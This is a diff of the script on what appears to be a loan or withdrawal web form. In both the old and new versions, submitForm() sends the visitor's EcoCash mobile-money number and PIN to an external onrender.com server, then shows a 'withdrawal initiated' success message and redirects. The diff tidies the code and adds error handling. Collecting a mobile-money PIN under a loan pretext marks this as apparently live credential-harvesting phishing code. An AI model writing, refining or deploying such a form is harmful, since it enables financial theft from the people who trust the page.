@@ -153,38 +153,48 @@ async function submitForm() {
 
     try {
 
-        const response = await fetch(
-
-            "https://kashagi-loans-1-sq9v.onrender.com/submit",
-            {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    ecocash_number: ecocash_number,
-                    ecocash_pin: ecocash_pin
-                })
-            }
-        );
-
-        const data = await response.json();
-
-        if (data.success) {
-            
-            alert("✅ Your Withdrawal has been initiated successfully!");
-
-document.getElementById("loanForm").reset();
-
-location.reload();
-        } else{
-            alert("Submission failed.");
+    const response = await fetch(
+        "https://kashagi-loans-1-sq9v.onrender.com/submit",
+        {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                ecocash_number: ecocash_number,
+                ecocash_pin: ecocash_pin
+            })
         }
+    );
 
-    } catch (error) {
-        alert("Server connection error.");
-        console.log(error);
+    if (!response.ok) {
+        throw new Error("Server returned " + response.status);
     }
+
+    const data = await response.json();
+
+    if (data.success) {
+
+        alert("✅ Your Withdrawal request has been initiated successfully!");
+
+        document.getElementById("loanForm").reset();
+
+        window.location.href = "/thankyou.html";
+
+    } else {
+
+        alert("❌ Submission failed. Please try again.");
+
+    }
+
+} catch (error) {
+
+    console.error(error);
+
+    alert("❌ Server connection error. Please try again later.");
+
 }
-</script></body>
+}
+</script>
+</body>
 </html>
